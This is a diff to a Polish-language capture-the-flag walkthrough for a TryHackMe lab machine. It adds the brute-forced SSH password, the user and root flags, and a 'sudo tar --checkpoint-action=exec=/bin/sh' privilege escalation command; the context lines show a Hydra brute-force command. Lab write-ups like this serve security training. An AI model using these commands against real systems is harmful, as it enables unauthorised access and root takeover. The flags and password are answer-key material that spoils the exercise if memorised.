@@ -56,6 +56,14 @@ w task.txt znajduję się kto napisał listę zadań
   Zadanie 4. What service can you bruteforce with the text file found? Odpowiedzią będzie SSH i w tym przypadku wykorzystamy listę locks.txt, które udało nam się pobrać
  z FTP, więc zaczynamy.
   Zadanie 5. What is the users password? Wykorzystamy do tego zadania Hydre, hydra -l lin -P locks.txt MACHINE_IP 22
+Odpwoedzią na pytanie 5 jest RedDr4gonSynd1cat3, teraz za pomocą tego hasła możemy się dostać do SSH, więc przechodzimy ssh lin@MACHINE_IP i podajemy hasło.
+  Zadanei 6. user.txt po zalogowaniu się do SSH wystarczy wpisać cat user.txt i otrzymujemy naszą flagę. THM{CR1M3_SyNd1C4T3}
+  Zadanie 7. root.txt Pierwszym krokiem będzie wpisanie sudo -l, czytaj uważnie bo musiałem skorzystać tutaj z podpowiedzi jestem tam napisane password for lim.
+  Po wpisaniu hasła ukazuje się nam (root) /bin/tar wyszukajmy sobie tar na GTFOBins, znajdujemy prosty sposób na eskalacje do root'a.
+  
 
+    sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh
+
+Po wpisaniu tej komendy uzyskujemy roota, i możemy podejrzeć flagę root'a THM{80UN7Y_h4cK3r}
 
 
